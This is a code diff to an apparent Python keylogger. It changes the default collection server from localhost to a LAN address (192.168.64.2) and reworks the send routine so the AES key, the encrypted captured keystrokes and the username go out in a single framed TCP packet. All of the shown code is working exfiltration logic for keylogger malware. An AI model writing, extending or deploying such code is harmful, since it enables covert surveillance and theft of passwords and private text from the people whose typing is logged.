@@ -14,8 +14,7 @@ from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 
 DEFAULT_PORT = 48939
-# DEFAULT_SERVER = "192.168.64.2"
-DEFAULT_SERVER = "localhost"
+DEFAULT_SERVER = "192.168.64.2"
 DEFAULT_USERNAME = ""
 
 CONFIG_FILE = "keylogger_config"
@@ -154,6 +153,18 @@ def encryptMessage(msg, key):
 	return encrypted.getvalue()
 
 
+def formatMessage(aes_key, msg):
+	length = len(aes_key)
+
+	# one byte should be enough! because key length is 16 bits after encryption
+	# it can become bigger, but bigger like 50 bytes not 300 bytes
+	lenBytes = bytes([length])
+
+	output = lenBytes + aes_key + msg
+
+	return output
+
+
 def sendMessage(msg):
 	'''
 	Create TCP connection to the server, then do the following:
@@ -175,18 +186,14 @@ def sendMessage(msg):
 		aes_key = createKey()
 		encryptedKey = encryptKey(aes_key)
 		encodedKey = encodeKey(encryptedKey)
-		clientSock.sendall(encodedKey)
-		time.sleep(0.5)
 
-		encryptedMsg = encryptMessage(msg, aes_key)
-		# do not need to encode because the encryption is bytes
-		clientSock.sendall(encryptedMsg)
-		time.sleep(0.5)
+		encryptedMsg = encryptMessage(msg + "\n" + username, aes_key)
 
-		if len(username) > 0:
-			encryptedUser = encryptMessage(username, aes_key)
-			clientSock.sendall(encryptedUser)
+		toSend = formatMessage(encodedKey, encryptedMsg)
+
+		clientSock.send(toSend)
 	except:
+		print("FAILURE IN SENDING")
 		pass
 
 	clientSock.close()
